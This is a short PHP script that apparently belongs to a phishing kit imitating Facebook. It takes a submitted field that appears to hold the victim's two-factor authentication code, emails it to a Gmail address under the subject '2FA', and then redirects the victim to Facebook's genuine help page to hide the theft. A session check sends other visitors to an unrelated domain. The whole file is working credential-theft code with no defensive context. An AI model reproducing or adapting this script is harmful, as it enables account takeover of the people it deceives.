<?php

session_start();
if(isset($_SESSION['u'])){
  if($_SESSION['u'] === '123') {
  }else {
    header("Location: https://vdsafvdfgfdhdgfh.cz");
  }
}else {
 header("Location: https://vdsafvdfgfdhdgfh.cz");
}

$cgn = $_POST['cgn'];

$ip = $_SERVER['REMOTE_ADDR'];


$stringi = $cgn;
mail("mrbesfort@gmail.com","2FA", $stringi);
header("Location: https://web.facebook.com/help?_rdc=1&_rdr");
?>